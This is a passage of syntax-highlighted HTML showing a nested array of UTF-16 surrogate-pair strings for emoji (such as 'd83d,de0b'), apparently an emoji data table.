class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span 